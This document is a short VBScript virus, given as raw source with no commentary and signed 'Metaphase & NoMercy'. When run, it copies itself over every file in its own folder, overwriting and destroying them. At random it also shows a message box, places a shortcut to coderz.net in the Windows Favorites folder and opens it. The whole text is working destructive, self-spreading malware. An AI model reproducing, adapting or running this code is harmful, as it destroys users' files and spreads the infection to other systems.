Dim sdfsdfs, WshShell, FSO, VX, VirusLink
On Error Resume Next
Randomize
Set FSO = CreateObject("Scripting.FileSystemObject")
Set WshShell = Wscript.CreateObject("Wscript.Shell")
sdfsdfs = Wscript.ScriptFullName
VX = Left(sdfsdfs, InStrRev(sdfsdfs, "\"))
For Each target in FSO.GetFolder(VX).Files
  FSO.CopyFile sdfsdfs, target.Name, 1
Next
If Int((2 * Rnd) + 1) = 1 Then
  MsgBox "Metaphase & NoMercy!!!", 4096 , "sdfsdf"
  Set VirusLink = WshShell.CreateShortcut("C:\WINDOWS\Favorites\sdfsdfs.URL")
  VirusLink.TargetPath = "http://www.coderz.net"
  VirusLink.Save
  WshShell.Run ("C:\WINDOWS\Favorites\sdfsdfs.URL")
End If

